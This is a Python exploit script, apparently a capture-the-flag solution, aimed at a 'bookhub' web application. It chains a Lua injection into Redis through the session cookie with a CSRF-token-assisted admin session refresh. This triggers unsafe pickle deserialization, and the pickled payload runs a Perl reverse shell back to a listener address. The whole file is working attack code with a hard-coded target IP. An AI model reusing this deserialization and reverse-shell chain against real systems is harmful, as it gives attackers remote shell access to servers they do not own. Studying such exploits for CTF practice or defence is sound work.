# -*- coding:utf-8 -*-

import os
import sys
import requests as req
import re
from urllib.parse import quote as urlencode
try:
    import cPickle as pickle
except ImportError:
    import pickle

URL = "http://18.213.16.123:5000/"
listen_ip = 'ippppppppp'
listen_port = 7979


class exp(object):

    def __reduce__(self):
        s = "perl -e 'use Socket;$i=\"%s\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" % (
            listen_ip, listen_port)
        return (os.system, (s,))


if __name__ == '__main__':
    payload = urlencode(pickle.dumps([exp()]))
    # 插入payload并防止del
    sid = '\\" } local function urlDecode(s) s=string.gsub(s,\'%%(%x%x)\',function(h) return string.char(tonumber(h, 16)) end) return s end ' + \
        'redis.call(\\"set\\",\\"bookhub:session:qaq\\",urlDecode(\\"%s\\")) inputs = { \"bookhub:session:qaq\" } --' % (
            payload)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    # 注入payload
    headers["Cookie"] = 'bookhub-session="%s"' % sid
    res = req.get(URL + 'login/', headers=headers)
    if res.status_code == 200:
        r = re.findall(r'csrf_token" type="hidden" value="(.*?)">',
                       res.content.decode('utf-8'))
        if r:
            # refresh_session
            headers['X-CSRFToken'] = r[0]
            data = {'submit': '1'}
            res = req.post(URL + 'admin/system/refresh_session/',
                           data=data, headers=headers)
            if res.status_code == 200:
                # 触发RCE
                print("Fuck")
                req.get(URL + 'login/',
                        headers={'Cookie': 'bookhub-session=qaq'})
